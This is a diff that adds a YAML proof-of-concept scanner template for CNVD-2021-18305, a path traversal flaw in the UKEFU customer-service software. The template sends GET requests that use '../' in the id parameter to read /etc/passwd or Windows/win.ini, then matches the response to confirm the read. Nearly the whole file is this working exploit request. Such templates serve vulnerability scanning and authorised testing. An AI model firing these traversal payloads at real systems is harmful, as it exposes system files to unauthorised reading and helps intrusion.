@@ -1,0 +1,24 @@
+name: poc-yaml-ukefu-cnvd-2021-18305-file-read
+manual: true
+transport: http
+rules:
+    linux:
+        request:
+            cache: true
+            method: GET
+            path: /res/voice.html?id=../etc/passwd
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+    windows:
+        request:
+            cache: true
+            method: GET
+            path: /res/voice.html?id=../Windows/win.ini
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: linux() || windows()
+detail:
+    author: socat
+    links:
+        - https://mp.weixin.qq.com/s/sJAyhQQvGqG-SliSGbhJNA
+    vulnerability:
+        id: CT-517459
+        level: high
